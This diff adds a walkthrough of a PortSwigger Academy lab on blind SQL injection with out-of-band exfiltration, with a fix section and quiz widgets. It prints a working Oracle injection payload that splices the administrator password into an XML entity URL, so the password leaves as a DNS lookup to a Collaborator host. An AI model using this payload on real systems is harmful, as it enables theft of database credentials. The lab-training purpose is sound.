@@ -1,39 +1,103 @@
 ---
 title: Blind SQL injection with out-of-band data exfiltration
-date: '2025-06-18'
+date: '2026-07-15'
 tags:
   - PortSwigger
   - lab
   - sql-injection
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Blind SQL injection with out-of-band
-  data exfiltration. Walkthrough with solution, key takeaways, and blind replay
-  exercise.
+excerpt: "Oracle's XMLTYPE external entity resolves a URL I build at query time, so the admin password rides out of the database inside a Collaborator DNS lookup."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Blind SQL injection with out-of-band data exfiltration
 
-## Objective
+Once the database will talk to a host you control, the next question is how to put actual data inside the message. This lab is that step, and it is the previous injection with one clause added.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+Same `TrackingId` cookie, same Oracle backend, same asynchronous query that never touches the response. There is again a `users` table with `username` and `password`, and the goal is to recover the `administrator` password and log in.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+Because nothing about the request changes based on the data, the password has to leave through the one channel I already have: an outbound lookup.
 
-## Key Takeaway
+## How the vulnerability works
 
-*Write ONE principle I must remember*
+The external entity in the last lab pointed at a fixed URL. Nothing stops that URL from being built at query time. Oracle lets me concatenate the result of a subquery straight into the string that becomes the entity's `SYSTEM` target.
 
-## Next-Day Blind Replay
+So instead of `http://COLLABORATOR-SUBDOMAIN/`, the URL becomes `http://<password>.COLLABORATOR-SUBDOMAIN/`. The DNS request for that hostname carries the secret in its own name, and Collaborator records the full name it was asked for.
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+There is no guessing here. One request, one interaction, and the value is sitting in the logs.
+
+## Solving it
+
+1. Get a fresh Collaborator subdomain from the Collaborator client, exactly as in the interaction lab.
+2. Intercept the request and inject a payload that splices the password into the entity URL:
+
+```
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+```
+
+URL-encode it and send.
+
+3. Go to the Collaborator tab and click "Poll now". If nothing shows, wait a few seconds and poll again. The query runs off the request path, so the interaction can arrive after the response.
+4. Open the interaction. For a DNS hit the full looked-up name is in the description. For an HTTP hit it is in the `Host` header of the request to Collaborator.
+5. Read the `administrator` password out of the subdomain and log in with it.
+
+## Why that payload works
+
+Everything from `XMLTYPE` down behaves as before: the external entity makes Oracle resolve the URL and the parse is the trigger. The new part is that the `SYSTEM` literal is no longer a constant. The `||` concatenations happen in SQL, so the query result is baked into the URL before the parser ever resolves it. The password rides out as part of the hostname because the hostname is the only piece of the request the attacker gets to choose.
+
+## The fix
+
+Parameterise the query so the cookie is data. Disable external entity resolution in the XML parser. Block the database host from making arbitrary outbound DNS and HTTP requests, which is what turns a read-only query into an exfiltration channel. Least privilege on the database user caps the damage when a query does leak.
+
+<Cloze
+  title="Where the secret rides"
+  text="The exfil payload builds the entity URL with the {{||}} operator, selects the value with {{password}}, and it reaches the listener as a {{DNS}} lookup."
+/>
+
+<QuizCard
+  title="Out-of-band checks"
+  questions={[
+    {
+      question: "Where does the exfiltrated password actually show up?",
+      options: [
+        "In the subdomain of the Collaborator interaction",
+        "In the page body",
+        "In a response header",
+        "In a database error message"
+      ],
+      correct: 0,
+      explanation: "The query result never reaches the page. It is concatenated into the attacker URL, so Oracle's DNS lookup carries it out in the hostname."
+    },
+    {
+      question: "Why is there no time-based option on this lab?",
+      options: [
+        "The query runs asynchronously, so it never blocks the response",
+        "Oracle has no sleep function",
+        "The cookie is bound to the session",
+        "Timing is blocked by a firewall"
+      ],
+      correct: 0,
+      explanation: "The analytics query runs off the request path, so the clock tells you nothing. The only channel left is outbound traffic."
+    },
+    {
+      question: "What makes Oracle resolve the attacker URL?",
+      options: [
+        "An external DTD entity resolved while parsing the XMLTYPE document",
+        "A redirect in the response",
+        "A server-side request from the app",
+        "A DNS TXT lookup inside the SQL"
+      ],
+      correct: 0,
+      explanation: "The XXE entity in the parsed document is the fetch. EXTRACTVALUE is just what forces the parse."
+    }
+  ]}
+/>
+
+<IdeaNode color="#ff5500">
+DNS labels are capped at 63 characters, so a long secret can arrive split across labels. Read the whole queried name in the interaction, not just the first label.
+</IdeaNode>
